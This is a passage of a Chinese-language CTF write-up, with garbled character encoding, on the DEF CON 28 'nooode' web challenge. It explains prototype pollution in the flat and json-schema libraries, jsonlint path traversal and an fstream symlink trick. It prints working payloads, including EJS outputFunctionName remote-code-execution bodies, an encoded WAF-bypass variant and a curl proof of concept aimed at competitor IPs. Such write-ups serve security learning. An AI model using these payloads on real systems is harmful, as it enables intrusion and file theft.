undefined) { const type = Object.prototype.toString.call(recipient[key1]) const isobject = ( type === \u0026#39;[object Object]\u0026#39; || type === \u0026#39;[object Array]\u0026#39; ) // do not write over falsey, non-undefined values if overwrite is false  if (!overwrite \u0026amp;\u0026amp; !isobject \u0026amp;\u0026amp; typeof recipient[key1] !== \u0026#39;undefined\u0026#39;) { return } if ((overwrite \u0026amp;\u0026amp; !isobject) || (!overwrite \u0026amp;\u0026amp; recipient[key1] == null)) { recipient[key1] = ( typeof key2 === \u0026#39;number\u0026#39; \u0026amp;\u0026amp; !opts.object ? [] : {} ) } recipient = recipient[key1] if (split.length \u0026gt; 0) { key1 = getkey(split.shift()) key2 = getkey(split[0]) } } // unflatten again for \u0026#39;messy objects\u0026#39;  recipient[key1] = unflatten(target[key], opts) }) return result } æˆ‘ä»¬ä¼ å…¥{\u0026quot;__proto__.path\u0026quot;: \u0026quot;/flag\u0026quot;} åˆ° target å˜é‡ï¼Œç„¶åç»è¿‡ä¸€äº›åˆ¤æ–­ä»¥åŠæ“ä½œï¼Œç»è¿‡ while ç¬¬ä¸€è½®å¾ªç¯å¾—åˆ°:\nrecipient = recipient[key1]\t//recipient = {}[\u0026#34;__proto__\u0026#34;] æ­¤æ—¶ recipient å°±æŒ‡å‘äº† Function.prototype ï¼Œè€Œå¾ªç¯ç»“æŸä¹‹åé€’å½’æ‰§è¡Œ unflatten å‡½æ•°ï¼Œæ­¤æ—¶\nrecipient[key1] = unflatten(target[key], opts) // recipient[\u0026#39;path\u0026#39;] = unflatten(\u0026#34;/flag\u0026#34;, {}) è€Œå› ä¸ºä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¹Ÿå°±æ˜¯ /flag ä¸ºå­—ç¬¦ä¸²ï¼Œè¢« unflatten ç›´æ¥è¿”å›ï¼Œä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆç»“æœä¸ºï¼š\nrecipient[key1] = \u0026#39;/flag\u0026#39;\t//recipient[\u0026#39;path\u0026#39;] = \u0026#39;/flag\u0026#39; æ•´ä¸ªæµç¨‹å¯ä»¥ç®€åŒ–ä¸ºï¼š\nvar obj = {}; var a = {}; obj = obj[\u0026#34;__proto__\u0026#34;]; obj[\u0026#39;path\u0026#39;] = \u0026#39;/flag\u0026#39;; console.log(obj.path); console.log(a.path); è¿™æ ·å°±å®Œæˆäº†åŸå‹é“¾æ±¡æŸ“çš„æ•ˆæœï¼Œæˆ‘ä»¬å°±å¯ä»¥å°† config.path æ±¡æŸ“æˆ flag è·¯å¾„äº†ï¼Œä¹Ÿå°±å¯ä»¥è¯»åˆ° flag äº†\nå­˜åœ¨ä¸€äº›å˜å½¢æ¯”å¦‚ï¼š\n æ›´æ”¹ä¼ è¾“æ–¹å¼ä¸ºapplication/x-www-form-urlencoded æ›´æ”¹å¼•ç”¨è·¯å¾„POST /config/validated/..%2fnode_modules%2fflat/unflatten HTTP/1.1  é¡ºä¾¿ï¼Œflat å·²ç»ä¿®å¤äº†è¿™ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¿®å¤æ–¹å¼æ˜¯å°†__proto__è®¾ç½®ä¸º key1 çš„é»‘åå•ï¼šhttps://github.com/hughsk/flat/pull/106/commits/b7815abada29592b0067e391ab215a462a7347e8\nJsonlint POST /config/validated/jsonlint/main HTTP/1.1 Host: zedd.vv:4017 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/json Content-Length: 33 {\u0026#34;1\u0026#34;:\u0026#34;../../../../../../../flag\u0026#34;} HTTP/1.1 500 Internal Server Error Content-Type: text/html; charset=utf-8 Content-Length: 1162 ETag: W/\u0026#34;48a-J1p7tUkAXQsyvitsec7yxDGU9yc\u0026#34; Date: Tue, 13 Oct 2020 16:58:55 GMT Connection: close \u0026lt;h1\u0026gt;Parse error on line 1: 000AAAA ^ Expecting \u0026amp;#39;STRING\u0026amp;#39;, \u0026amp;#39;NUMBER\u0026amp;#39;, \u0026amp;#39;NULL\u0026amp;#39;, \u0026amp;#39;TRUE\u0026amp;#39;, \u0026amp;#39;FALSE\u0026amp;#39;, \u0026amp;#39;{\u0026amp;#39;, \u0026amp;#39;[\u0026amp;#39;, got \u0026amp;#39;undefined\u0026amp;#39;\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;pre\u0026gt;Error: Parse error on line 1: 000AAAA ^ Expecting \u0026amp;#39;STRING\u0026amp;#39;, \u0026amp;#39;NUMBER\u0026amp;#39;, \u0026amp;#39;NULL\u0026amp;#39;, \u0026amp;#39;TRUE\u0026amp;#39;, \u0026amp;#39;FALSE\u0026amp;#39;, \u0026amp;#39;{\u0026amp;#39;, \u0026amp;#39;[\u0026amp;#39;, got \u0026amp;#39;undefined\u0026amp;#39; at Object.parseError (/service/node_modules/jsonlint/lib/jsonlint.js:55:11) at Object.parse (/service/node_modules/jsonlint/lib/jsonlint.js:132:22) at Object.commonjsMain [as main] (/service/node_modules/jsonlint/lib/jsonlint.js:427:27) at /service/routes/config.js:22:36 at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5) at next (/service/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/service/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5) at /service/node_modules/express/lib/router/index.js:281:22 at param (/service/node_modules/express/lib/router/index.js:354:14)\u0026lt;/pre\u0026gt; è¿™ä¸ªä¹Ÿæ¯”è¾ƒç®€å•ï¼Œjsonlint lib ä¸­æœ‰ä¸€ä¸ª main å‡½æ•°å­˜åœ¨ç›´æ¥å¼•ç”¨æ–‡ä»¶çš„æ“ä½œï¼š\nexports.main = function commonjsMain(args) { if (!args[1]) throw new Error(\u0026#39;Usage: \u0026#39;+args[0]+\u0026#39; FILE\u0026#39;); if (typeof process !== \u0026#39;undefined\u0026#39;) { var source = require(\u0026#39;fs\u0026#39;).readFileSync(require(\u0026#39;path\u0026#39;).join(process.cwd(), args[1]), \u0026#34;utf8\u0026#34;); } else { var cwd = require(\u0026#34;file\u0026#34;).path(require(\u0026#34;file\u0026#34;).cwd()); var source = cwd.join(args[1]).read({charset: \u0026#34;utf-8\u0026#34;}); } return exports.parser.parse(source); } è€Œ args åˆ™æ˜¯æˆ‘ä»¬ä¼ å…¥çš„req.bodyï¼Œä¹Ÿå°±æ˜¯{\u0026quot;1\u0026quot;:\u0026quot;../../../../../../../flag\u0026quot;}ï¼Œç›´æ¥å¼•å…¥ flag æ–‡ä»¶å¯¼è‡´æŠ¥é”™å›æ˜¾å³å¯ã€‚\njson-schema è¿™ä¸ªåº“ç®—æ˜¯å®˜æ–¹ç»™çš„ä¸€ä¸ª hint å§ï¼Œå› ä¸ºç®—æ˜¯åœ¨/config/validatedè·¯ç”±é»˜è®¤ä½¿ç”¨çš„ lib ï¼Œè€Œä¸”æœäº†ä¸€ä¸‹æ˜¯ä¸€ä¸ªåºŸå¼ƒçš„ä»“åº“ï¼šhttps://github.com/kriszyp/json-schema/ ï¼Œè€Œä¸”çœ‹èµ·æ¥è¿˜èƒ½ç®—æ˜¯ä¸€ä¸ª 0day\n{\u0026quot;$schema\u0026quot;: {\u0026quot;properties\u0026quot;: {\u0026quot;__proto__\u0026quot;: {\u0026quot;properties\u0026quot;: {\u0026quot;path\u0026quot;: {\u0026quot;default\u0026quot;: \u0026quot;/flag\u0026quot;}}}}}} ç»è¿‡ç®€å•è°ƒè¯•å¯ä»¥å‘ç°ä¸»è¦é—®é¢˜åœ¨ä¸¤ä¸ªå‡½æ•°ï¼šcheckObj ä¸ checkProp\n// validate a value against a property definition function checkProp(value, schema, path, i) { var l; path += path ? typeof i == \u0026#39;number\u0026#39; ? \u0026#39;[\u0026#39; + i + \u0026#39;]\u0026#39;: typeof i == \u0026#39;undefined\u0026#39; ? \u0026#39;\u0026#39;: \u0026#39;.\u0026#39; + i: i; function addError(message) { errors.push({ property: path, message: message }); } if ((typeof schema != \u0026#39;object\u0026#39; || schema instanceof Array) \u0026amp;\u0026amp; (path || typeof schema != \u0026#39;function\u0026#39;) \u0026amp;\u0026amp; !(schema \u0026amp;\u0026amp; getType(schema))) { if (typeof schema == \u0026#39;function\u0026#39;) { if (! (value instanceof schema)) { addError(\u0026#34;is not an instance of the class/constructor \u0026#34; + schema.name); } } else if (schema) { addError(\u0026#34;Invalid schema/property definition \u0026#34; + schema); } return null; } if (_changing \u0026amp;\u0026amp; schema.readonly) { addError(\u0026#34;is a readonly field, it can not be changed\u0026#34;); } if (schema[\u0026#39;extends\u0026#39;]) { // if it extends another schema, it must pass that schema as well  checkProp(value, schema[\u0026#39;extends\u0026#39;], path, i); } // validate a value against a type definition  function checkType(type, value) { if (type) { if (typeof type == \u0026#39;string\u0026#39; \u0026amp;\u0026amp; type != \u0026#39;any\u0026#39; \u0026amp;\u0026amp; (type == \u0026#39;null\u0026#39; ? value !== null: typeof value != type) \u0026amp;\u0026amp; !(value instanceof Array \u0026amp;\u0026amp; type == \u0026#39;array\u0026#39;) \u0026amp;\u0026amp; !(value instanceof Date \u0026amp;\u0026amp; type == \u0026#39;date\u0026#39;) \u0026amp;\u0026amp; !(type == \u0026#39;integer\u0026#39; \u0026amp;\u0026amp; value % 1 === 0)) { return [{ property: path, message: (typeof value) + \u0026#34; value found, but a \u0026#34; + type + \u0026#34; is required\u0026#34; }]; } if (type instanceof Array) { var unionErrors = []; for (var j = 0; j \u0026lt; type.length; j++) { // a union type  if (! (unionErrors = checkType(type[j], value)).length) { break; } } if (unionErrors.length) { return unionErrors; } } else if (typeof type == \u0026#39;object\u0026#39;) { var priorErrors = errors; errors = []; checkProp(value, type, path); var theseErrors = errors; errors = priorErrors; return theseErrors; } } return []; } if (value === undefined) { if (schema.required) { addError(\u0026#34;is missing and it is required\u0026#34;); } } else { errors = errors.concat(checkType(getType(schema), value)); if (schema.disallow \u0026amp;\u0026amp; !checkType(schema.disallow, value).length) { addError(\u0026#34; disallowed value was matched\u0026#34;); } if (value !== null) { if (value instanceof Array) { if (schema.items) { var itemsIsArray = schema.items instanceof Array; var propDef = schema.items; for (i = 0, l = value.length; i \u0026lt; l; i += 1) { if (itemsIsArray) propDef = schema.items[i]; if (options.coerce) value[i] = options.coerce(value[i], propDef); errors.concat(checkProp(value[i], propDef, path, i)); } } if (schema.minItems \u0026amp;\u0026amp; value.length \u0026lt; schema.minItems) { addError(\u0026#34;There must be a minimum of \u0026#34; + schema.minItems + \u0026#34; in the array\u0026#34;); } if (schema.maxItems \u0026amp;\u0026amp; value.length \u0026gt; schema.maxItems) { addError(\u0026#34;There must be a maximum of \u0026#34; + schema.maxItems + \u0026#34; in the array\u0026#34;); } } else if (schema.properties || schema.additionalProperties) { errors.concat(checkObj(value, schema.properties, path, schema.additionalProperties)); } if (schema.pattern \u0026amp;\u0026amp; typeof value == \u0026#39;string\u0026#39; \u0026amp;\u0026amp; !value.match(schema.pattern)) { addError(\u0026#34;does not match the regex pattern \u0026#34; + schema.pattern); } if (schema.maxLength \u0026amp;\u0026amp; typeof value == \u0026#39;string\u0026#39; \u0026amp;\u0026amp; value.length \u0026gt; schema.maxLength) { addError(\u0026#34;may only be \u0026#34; + schema.maxLength + \u0026#34; characters long\u0026#34;); } if (schema.minLength \u0026amp;\u0026amp; typeof value == \u0026#39;string\u0026#39; \u0026amp;\u0026amp; value.length \u0026lt; schema.minLength) { addError(\u0026#34;must be at least \u0026#34; + schema.minLength + \u0026#34; characters long\u0026#34;); } if (typeof schema.minimum !== undefined \u0026amp;\u0026amp; typeof value == typeof schema.minimum \u0026amp;\u0026amp; schema.minimum \u0026gt; value) { addError(\u0026#34;must have a minimum value of \u0026#34; + schema.minimum); } if (typeof schema.maximum !== undefined \u0026amp;\u0026amp; typeof value == typeof schema.maximum \u0026amp;\u0026amp; schema.maximum \u0026lt; value) { addError(\u0026#34;must have a maximum value of \u0026#34; + schema.maximum); } if (schema[\u0026#39;enum\u0026#39;]) { var enumer = schema[\u0026#39;enum\u0026#39;]; l = enumer.length; var found; for (var j = 0; j \u0026lt; l; j++) { if (enumer[j] === value) { found = 1; break; } } if (!found) { addError(\u0026#34;does not have a value in the enumeration \u0026#34; + enumer.join(\u0026#34;, \u0026#34;)); } } if (typeof schema.maxDecimal == \u0026#39;number\u0026#39; \u0026amp;\u0026amp; (value.toString().match(new RegExp(\u0026#34;\\\\.[0-9]{\u0026#34; + (schema.maxDecimal + 1) + \u0026#34;,}\u0026#34;)))) { addError(\u0026#34;may only have \u0026#34; + schema.maxDecimal + \u0026#34; digits of decimal places\u0026#34;); } } } return null; } // validate an object against a schema function checkObj(instance, objTypeDef, path, additionalProp) { if (typeof objTypeDef == \u0026#39;object\u0026#39;) { if (typeof instance != \u0026#39;object\u0026#39; || instance instanceof Array) { errors.push({ property: path, message: \u0026#34;an object is required\u0026#34; }); } for (var i in objTypeDef) { if (objTypeDef.hasOwnProperty(i)) { var value = instance[i]; // skip _not_ specified properties  if (value === undefined \u0026amp;\u0026amp; options.existingOnly) continue; var propDef = objTypeDef[i]; // set default  if (value === undefined \u0026amp;\u0026amp; propDef[\u0026#34;default\u0026#34;]) { value = instance[i] = propDef[\u0026#34;default\u0026#34;]; } if (options.coerce \u0026amp;\u0026amp; i in instance) { value = instance[i] = options.coerce(value, propDef); } checkProp(value, propDef, path, i); } } } for (i in instance) { if (instance.hasOwnProperty(i) \u0026amp;\u0026amp; !(i.charAt(0) == \u0026#39;_\u0026#39; \u0026amp;\u0026amp; i.charAt(1) == \u0026#39;_\u0026#39;) \u0026amp;\u0026amp; objTypeDef \u0026amp;\u0026amp; !objTypeDef[i] \u0026amp;\u0026amp; additionalProp === false) { if (options.filter) { delete instance[i]; continue; } else { errors.push({ property: path, message: (typeof value) + \u0026#34;The property \u0026#34; + i + \u0026#34; is not defined in the schema and the schema does not allow additional properties\u0026#34; }); } } var requires = objTypeDef \u0026amp;\u0026amp; objTypeDef[i] \u0026amp;\u0026amp; objTypeDef[i].requires; if (requires \u0026amp;\u0026amp; !(requires in instance)) { errors.push({ property: path, message: \u0026#34;the presence of the property \u0026#34; + i + \u0026#34; requires that \u0026#34; + requires + \u0026#34; also be present\u0026#34; }); } value = instance[i]; if (additionalProp \u0026amp;\u0026amp; (!(objTypeDef \u0026amp;\u0026amp; typeof objTypeDef == \u0026#39;object\u0026#39;) || !(i in objTypeDef))) { if (options.coerce) { value = instance[i] = options.coerce(value, additionalProp); } checkProp(value, additionalProp, path, i); } if (!_changing \u0026amp;\u0026amp; value \u0026amp;\u0026amp; value.$schema) { errors = errors.concat(checkProp(value, value.$schema, path, i)); } } return errors; } é¦–å…ˆç¬¬ä¸€æ¬¡æˆ‘ä»¬ä¼šè¿›å…¥åˆ° checkProp å‡½æ•°ï¼Œä¼ å…¥ä»¥ä¸‹å‚æ•°ï¼Œå¹¶è¿›è¡Œå¾ªç¯\ncheckProp(instance,instance.$schema,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;); //instance = {\u0026#34;$schema\u0026#34;: {\u0026#34;properties\u0026#34;: {\u0026#34;__proto__\u0026#34;: {\u0026#34;properties\u0026#34;: {\u0026#34;path\u0026#34;: {\u0026#34;default\u0026#34;: \u0026#34;/flag\u0026#34;}}}}}} //instance.$schema = {\u0026#34;properties\u0026#34;: {\u0026#34;__proto__\u0026#34;: {\u0026#34;properties\u0026#34;: {\u0026#34;path\u0026#34;: {\u0026#34;default\u0026#34;: \u0026#34;/flag\u0026#34;}}}}} æ¥ç€åœ¨ç»è¿‡åˆ¤æ–­ä¹‹åè¿›å…¥checkObjå‡½æ•°\nif(schema.properties || schema.additionalProperties){ errors.concat(checkObj(value, schema.properties, path, schema.additionalProperties)); } //value = {\u0026#34;$schema\u0026#34;: {\u0026#34;properties\u0026#34;: {\u0026#34;__proto__\u0026#34;: {\u0026#34;properties\u0026#34;: {\u0026#34;path\u0026#34;: {\u0026#34;default\u0026#34;: \u0026#34;/flag\u0026#34;}}}}}} //schema.properties = {\u0026#34;__proto__\u0026#34;: {\u0026#34;properties\u0026#34;: {\u0026#34;path\u0026#34;: {\u0026#34;default\u0026#34;: \u0026#34;/flag\u0026#34;}}}} åœ¨å‡½æ•°å¾ªç¯ä¸­ï¼Œå†æ¬¡è¿›å…¥åˆ°checkPropå‡½æ•°\nfor(var i in objTypeDef){ if(objTypeDef.hasOwnProperty(i)){ var value = instance[i]; // skip _not_ specified properties  if (value === undefined \u0026amp;\u0026amp; options.existingOnly) continue; var propDef = objTypeDef[i]; // set default  if(value === undefined \u0026amp;\u0026amp; propDef[\u0026#34;default\u0026#34;]){ value = instance[i] = propDef[\u0026#34;default\u0026#34;]; } if(options.coerce \u0026amp;\u0026amp; i in instance){ value = instance[i] = options.coerce(value, propDef); } checkProp(value,propDef,path,i); //i = __proto__  //value = prototype  //propDDef = {\u0026#34;properties\u0026#34;: {\u0026#34;path\u0026#34;: {\u0026#34;default\u0026#34;: \u0026#34;/flag\u0026#34;}}}  } } å†æ¬¡ç”±åˆ¤æ–­è¿›å…¥åˆ°checkObjå‡½æ•°ï¼Œä¼ å…¥ä»¥ä¸‹å‚æ•°ï¼Œè¿™æ—¶å€™æ³¨æ„valueå‚æ•°å·²ç»è¢«æŒ‡å‘Function.prototype\nif(schema.properties || schema.additionalProperties){ errors.concat(checkObj(value, schema.properties, path, schema.additionalProperties)); } //value = prototype //schema.properties = {\u0026#34;path\u0026#34;: {\u0026#34;default\u0026#34;: \u0026#34;/flag\u0026#34;}} //path = \u0026#34;__proto__\u0026#34; æ‰€ä»¥å½“å†æ¬¡åœ¨è¿™é‡Œè¿›è¡Œèµ‹å€¼çš„æ—¶å€™ï¼Œinstanceæ­¤æ—¶æŒ‡å‘Function.prototypeï¼Œå‚æ•° i ä¸º pathï¼Œå³è¢« propDef['default'] ä¿®æ”¹æˆäº†/flagï¼Œè‡³æ­¤å®Œæˆäº†åŸå‹é“¾æ±¡æŸ“\n//instance = prototype //objTypeDef = {\u0026#34;path\u0026#34;: {\u0026#34;default\u0026#34;: \u0026#34;/flag\u0026#34;}} for(var i in objTypeDef){ if(objTypeDef.hasOwnProperty(i)){ var value = instance[i]; // skip _not_ specified properties  if (value === undefined \u0026amp;\u0026amp; options.existingOnly) continue; var propDef = objTypeDef[i]; // set default  //i = path  //value = undefined  //propDef = {\u0026#34;default\u0026#34;: \u0026#34;/flag\u0026#34;}  if(value === undefined \u0026amp;\u0026amp; propDef[\u0026#34;default\u0026#34;]){ value = instance[i] = propDef[\u0026#34;default\u0026#34;]; } if(options.coerce \u0026amp;\u0026amp; i in instance){ value = instance[i] = options.coerce(value, propDef); } checkProp(value,propDef,path,i); //value = \u0026#34;/flag\u0026#34;  //propDef = {\u0026#34;default\u0026#34;: \u0026#34;/flag\u0026#34;}  //path = \u0026#34;__proto__\u0026#34;  //i = \u0026#34;path\u0026#34;  } } æ•´ä¸ªè¿‡ç¨‹è¿™é‡Œå†™çš„æ¯”è¾ƒç®€å•ï¼Œä¸è¿‡åªè¦ç®€å• debug å°±å¯ä»¥å¼„æ˜ç™½æ•´ä¸ªæµç¨‹ï¼Œå¹¶ä¸ç®—å¾ˆéš¾ã€‚æ±¡æŸ“äº† path ä¹‹åï¼Œå°±å¯ä»¥è·Ÿå‰é¢çš„ä¸€æ ·ï¼Œç›´æ¥é€šè¿‡fs.readFileSync(p.path).toString()æ¥æ‹¿ flag äº†ã€‚\nå½“ç„¶è¿˜å¯ä»¥æ±¡æŸ“ express ejs\n{\u0026#34;$schema\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;object\u0026#34;,\u0026#34;properties\u0026#34;:{\u0026#34;__proto__\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;object\u0026#34;,\u0026#34;properties\u0026#34;:{\u0026#34;outputFunctionName\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;string\u0026#34;,\u0026#34;default\u0026#34;:\u0026#34;x;return eval(\\\u0026#34;process.mainModule.require(\u0026#39;fs\u0026#39;).readFileSync(\u0026#39;/fl\u0026#39;+\u0026#39;ag\u0026#39;).toString(\u0026#39;base64\u0026#39;)\\\u0026#34;);//x\u0026#34;},\u0026#34;path\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;string\u0026#34;,\u0026#34;default\u0026#34;:\u0026#34;/foo\u0026#34;}}}}}} å› ä¸ºå¦‚æœè¦æ±¡æŸ“ ejs çš„è¯éœ€è¦ç”¨åˆ°res.renderï¼Œè€Œåœ¨ app.js ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªé”™è¯¯å¤„ç†çš„åœ°æ–¹ä½¿ç”¨åˆ°äº†res.render\napp.set(\u0026#34;view engine\u0026#34;, \u0026#34;ejs\u0026#34;); //... // error handler app.use(function(err, req, res, next) { // set locals, only providing error in development  res.locals.message = err.message; res.locals.error = req.app.get(\u0026#34;env\u0026#34;) === \u0026#34;development\u0026#34; ? err: {}; // render the error page  res.status(err.status || 500); res.render(\u0026#34;error\u0026#34;); }); æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæŠ¥é”™æ¥è§¦å‘è¿™ä¸ªres.renderï¼Œè€Œæˆ‘ä»¬ä¼ å…¥çš„\u0026quot;path\u0026quot;:{\u0026quot;type\u0026quot;:\u0026quot;string\u0026quot;,\u0026quot;default\u0026quot;:\u0026quot;/foo\u0026quot;}å°±èµ·åˆ°äº†æ±¡æŸ“ä¹‹å‰çš„ path è®© nodejs è¯»å–åˆ°äº†ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶å¼•èµ·æŠ¥é”™ï¼Œè¿›è€Œè¿›å…¥é”™è¯¯å¤„ç†æ¥å®ç° ejs çš„å‘½ä»¤æ‰§è¡Œã€‚\næ‰€ä»¥ä¹‹å‰å¯¹äº flat çš„åŸå‹é“¾æ±¡æŸ“ä¹Ÿå¯ä»¥æ ¹æ®åŒæ ·çš„åŸç†è¿›è¡Œ RCE ï¼š\n{\u0026#34;__proto__.outputFunctionName\u0026#34;: \u0026#34;a=1;process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;touch /tmp/b\u0026#39;)//\u0026#34;,\u0026#34;__proto__.path\u0026#34;: \u0026#34;/foo\u0026#34;} è¿˜æœ‰ä¸€äº›æ”¹å˜å°±æ˜¯åˆ©ç”¨ç¼–ç æ¥ç»•è¿‡ä¸€äº› waf å…³é”®å­—ï¼š\n{\u0026#34;$schema\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;object\u0026#34;,\u0026#34;properties\u0026#34;:{\u0026#34;__proto__\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;object\u0026#34;,\u0026#34;properties\u0026#34;:{\u0026#34;outputFunctionName\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;string\u0026#34;,\u0026#34;default\u0026#34;:\u0026#34;x;return eval(`\\\\u0070\\\\u0072\\\\u006f\\\\u0063\\\\u0065\\\\u0073\\\\u0073\\\\u002e\\\\u006d\\\\u0061\\\\u0069\\\\u006e\\\\u004d\\\\u006f\\\\u0064\\\\u0075\\\\u006c\\\\u0065\\\\u002e\\\\u0072\\\\u0065\\\\u0071\\\\u0075\\\\u0069\\\\u0072\\\\u0065\\\\u0028\\\\u0060\\\\u0066\\\\u0073\\\\u0060\\\\u0029\\\\u002e\\\\u0072\\\\u0065\\\\u0061\\\\u0064\\\\u0046\\\\u0069\\\\u006c\\\\u0065\\\\u0053\\\\u0079\\\\u006e\\\\u0063\\\\u0028\\\\u0060\\\\u002f\\\\u0066\\\\u006c\\\\u0060\\\\u002b\\\\u0060\\\\u0061\\\\u0067\\\\u0060\\\\u0029\\\\u002e\\\\u0074\\\\u006f\\\\u0053\\\\u0074\\\\u0072\\\\u0069\\\\u006e\\\\u0067\\\\u0028\\\\u0060\\\\u0062\\\\u0061\\\\u0073\\\\u0065\\\\u0036\\\\u0034\\\\u0060\\\\u0029`);//x\u0026#34;},\u0026#34;path\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;string\u0026#34;,\u0026#34;default\u0026#34;:\u0026#34;/foo\u0026#34;}}}}}} èµ›åè·Ÿ /bin/tw çš„é€‰æ‰‹äº¤æµäº†ä¸€ä¸‹ï¼Œä»–ä»¬çš„ payload åˆ°åé¢ä»ç„¶å¯ä»¥æ‰“å¥½å‡ ä¸ªé˜Ÿï¼Œäºæ˜¯å»è¦äº†ä¸€ä»½ POC ï¼Œå¦‚ä¸‹ï¼Œä¹Ÿæ˜¯å¤§æ¦‚ç±»ä¼¼çš„ä¸€ä¸ªå†™æ³•ï¼š\ncurl http://10.13.37.$i:14017/config/validated/json-schema/validate -H \u0026#39;content-type: application/json\u0026#39; --data \u0026#39;{\u0026#34;$schema\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;object\u0026#34;,\u0026#34;properties\u0026#34;:{\u0026#34;__proto__\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;object\u0026#34;,\u0026#34;properties\u0026#34;:{\u0026#34;outputFunctionName\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;string\u0026#34;,\u0026#34;default\u0026#34;:\u0026#34;x;var buf = Buffer.alloc(128);var fs = process.mainModule.require(`fs`);var fd=fs.openSync(`/fl`+`ag`);fs.readSync(fd, buf, 0, 128);fs.closeSync(fd);return buf.toString();//x\u0026#34;},\u0026#34;path\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;string\u0026#34;,\u0026#34;default\u0026#34;:\u0026#34;/foo\u0026#34;}}}}}}\u0026#39; fstream è¿˜æœ‰ä¸€ä¸ªæ˜¯æˆ‘ä»¬é˜Ÿå¤§å¸ˆå‚…æ‰¾çš„\nPOST /config/validated/fstream/Writer HTTP/1.1 Host: zedd.vv:4017 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/json Content-Length: 77 {\u0026#34;type\u0026#34;:\u0026#34;SymbolicLink\u0026#34;,\u0026#34;linkpath\u0026#34;:\u0026#34;/flag\u0026#34;,\u0026#34;path\u0026#34;:\u0026#34;public/stylesheets/11.png\u0026#34;} è¿™ä¸ªä¹Ÿæ²¡ä»€ä¹ˆå¥½åˆ†æçš„ï¼Œæ–‡æ¡£çœ‹ä¸€çœ‹ï¼šhttps://github.com/npm/fstream å°±å¥½äº†ï¼Œè¿™é‡Œå½“æ—¶æˆ‘ä»¬è²Œä¼¼è¿˜æ£é¼“äº†ä¸€ä¼š json ä¼ å‚å•¥çš„ï¼Œä½†æ˜¯åæ¥è¯•äº†ä¸€ä¸‹application/x-www-form-urlencoded ä¹Ÿå¯ä»¥\nConclusion About The Web è¿™æ¬¡ Web å½“æ—¶æ¯”èµ›æˆ‘ä»¬ä¹Ÿéƒ½åœ¨åæ§½ï¼Œå› ä¸ºè¿™ä¸ª Web é¢˜å½“æ—¶è§‰å¾—å¹¶ä¸æ˜¯å¾ˆå¥½ï¼Œç®€ç›´å°±ç›´æ¥ç»™äº†ä¸€ä¸ªåé—¨ï¼Œè€Œä¸”ç¡®å®æ•´ä¸ªæ¯”èµ›å¼„èµ·æ¥ä¸ä»…æ˜¯ Web è¿™ä¸ªåé—¨ä¼¼çš„æ´ï¼Œè¿˜æœ‰å…¶ä»–é¢˜ç›®å¬å…¶ä»–å¤§å¸ˆå‚…åæ§½ä¹Ÿéƒ½æ˜¯æ‰¾åé—¨çš„é¢˜ç›®ã€‚\nåé¢çœ‹äº†å‡ºé¢˜äººç›¸å…³çš„è®²è¿°ï¼Œè®²è¿°è§†é¢‘åœ°å€ï¼šnooode DEF CON 28 CTF Challenge w/ Guest kaptain | CTF Radiooo 003 ï¼Œåæ¥è§‰å¾—å§ï¼Œç¡®å®ä¹Ÿè¿˜è¿‡å¾—å»ï¼Œè¿™ä¸ªé¢˜ç›®å¢åŠ äº†ä¸€äº›å¤šå…ƒåŒ–çš„è®¾è®¡ï¼Œå› ä¸ºå¼•å…¥äº†å¾ˆå¤š lib ï¼Œæ‰€ä»¥æœ‰å¾ˆå¤šå§¿åŠ¿å¯ä»¥å»å°è¯•ï¼Œå¯ä»¥å»æŒ–ï¼Œæ¯”èµ›é€”ä¸­é‚£æ¬¡é‡ç½®åº”è¯¥ä¹Ÿå°±æ˜¯åŠ å¼ºäº† checker ï¼Œä¹Ÿçœ‹å¾—å‡º OOO åœ¨è¿™æ–¹é¢è¿˜æ˜¯å°½åŠ›äº†ã€‚ï¼ˆå¦‚æœä½ åˆ æ‰é¢˜ç›®ç»™çš„ node_modules ï¼Œç„¶åé‡æ–° install çš„è¯ï¼Œä¼šå‘ç°å®˜æ–¹ç»™çš„å¤šå‡ºä¸€ä¸ª vm2 ï¼Œå½“æ—¶æˆ‘ä»¬å°±åœ¨æƒ³éš¾ä¸æˆè¿˜å¯èƒ½æ˜¯ vm2 